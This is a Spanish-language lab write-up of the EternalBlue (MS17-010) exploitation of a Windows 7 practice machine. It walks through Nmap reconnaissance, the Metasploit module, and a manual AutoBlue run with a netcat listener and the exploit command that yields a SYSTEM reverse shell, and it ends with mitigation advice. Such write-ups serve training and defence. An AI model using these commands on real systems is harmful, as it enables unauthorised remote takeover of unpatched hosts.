> **Máquina:** Ethernal · **Plataforma:** Hacking · **SO:** Windows 7 SP1 · **Dificultad:** Duro

## 1. Reconocimiento

El reconocimiento inicial parte de un descubrimiento de hosts en el segmento de red mediante `arp-scan`, que identifica la máquina objetivo en la dirección `192.168.213.132`.

![Descubrimiento de host con arp-scan](/assets/informes/ethernal/p03_01.jpg)

A continuación se realiza un escaneo completo de los 65 535 puertos TCP con Nmap, exportando el resultado para su posterior análisis. Se detectan expuestos los puertos 135, 139 y 445, junto a un rango de puertos RPC dinámicos.

![Escaneo de puertos con Nmap](/assets/informes/ethernal/p03_02.jpg)

Un segundo escaneo con detección de versiones y scripts confirma que el objetivo es un **Windows 7 Ultimate 7601 Service Pack 1** con el servicio SMB activo en el puerto 445.

![Detección de versión de SO y servicios](/assets/informes/ethernal/p04_03.jpg)

## 2. Análisis de vulnerabilidades

El análisis con OpenVAS y con los scripts NSE de Nmap sobre el puerto 445 revela la presencia de **MS17-010 (CVE-2017-0143)**, clasificada como crítica. Se trata de la vulnerabilidad conocida como **EternalBlue**, que permite la ejecución remota de código con privilegios de sistema sobre implementaciones vulnerables de SMBv1.

![Detección de MS17-010 con scripts de Nmap](/assets/informes/ethernal/p04_04.jpg)

Resumen del objetivo:

| Campo | Valor |
|---|---|
| IP | 192.168.213.132 |
| Sistema Operativo | Windows 7 SP1 |
| Puertos | 135/msrpc · 139/netbios-ssn · 445/microsoft-ds · 49152-49157 |
| Vulnerabilidad | MS17-010 (EternalBlue) |

![Ficha de la vulnerabilidad EternalBlue](/assets/informes/ethernal/p05_05.jpg)

## 3. Explotación

### Vía automatizada — Metasploit

Se emplea el módulo `exploit/windows/smb/ms17_010_eternalblue`, localizado mediante `search ms17-010`.

![Búsqueda del módulo en Metasploit](/assets/informes/ethernal/p06_06.jpg)

Tras revisar los parámetros requeridos con `show options`, se configura el objetivo en `RHOSTS`.

![Opciones del exploit](/assets/informes/ethernal/p06_07.jpg)

La ejecución del módulo compromete el objetivo y devuelve una sesión de Meterpreter con privilegios `NT AUTHORITY\SYSTEM`.

![Sesión de Meterpreter obtenida](/assets/informes/ethernal/p07_08.jpg)

Se verifica el acceso consultando la configuración de red del objetivo desde la sesión.

![ipconfig desde Meterpreter](/assets/informes/ethernal/p08_09.jpg)

### Vía manual — AutoBlue

Con fines de contraste, la explotación se reproduce de forma manual. Se clona el exploit público AutoBlue-MS17-010:

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
```

![Repositorio AutoBlue-MS17-010](/assets/informes/ethernal/p09_10.jpg)

![Contenido del directorio clonado](/assets/informes/ethernal/p09_11.jpg)

Se otorgan permisos de ejecución al exploit correspondiente a Windows 7 y se instalan las dependencias del proyecto:

```bash
sudo chmod +x eternalblue_exploit7.py
pip install -r requirements.txt
```

![Instalación de dependencias](/assets/informes/ethernal/p10_12.jpg)

El script `shell_prep.sh`, dentro del directorio `shellcode`, genera el shellcode solicitando la IP y el puerto de escucha del atacante.

![Generación del shellcode con shell_prep.sh](/assets/informes/ethernal/p11_13.jpg)

![Scripts .asm en el directorio shellcode](/assets/informes/ethernal/p11_14.jpg)

![Shellcode .bin generado](/assets/informes/ethernal/p11_15.jpg)

Con un listener a la escucha (`nc -lvnp 1234`), se lanza el exploit contra el objetivo:

```bash
python eternalblue_exploit7.py 192.168.213.132 shellcode/sc_x64.bin
```

![Ejecución del exploit manual](/assets/informes/ethernal/p12_16.jpg)

El ataque tiene éxito y se recibe una reverse shell interactiva sobre el objetivo.

![Reverse shell recibida](/assets/informes/ethernal/p12_17.jpg)

![Verificación de red en la shell obtenida](/assets/informes/ethernal/p12_18.jpg)

## 4. Escalada de privilegios

No se requiere escalada: EternalBlue proporciona ejecución de código directamente en el contexto de `NT AUTHORITY\SYSTEM`.

## 6. Herramientas utilizadas

Kali Linux, Nmap, OpenVAS, Metasploit Framework, Exploit-DB y el exploit público AutoBlue-MS17-010.

## 7. Recomendaciones de mitigación

Deshabilitar el protocolo SMBv1 y aplicar la actualización de seguridad MS17-010 publicada por Microsoft. Complementariamente, segmentar la red para restringir el acceso al puerto 445 y mantener el sistema operativo dentro de su ciclo de soporte.
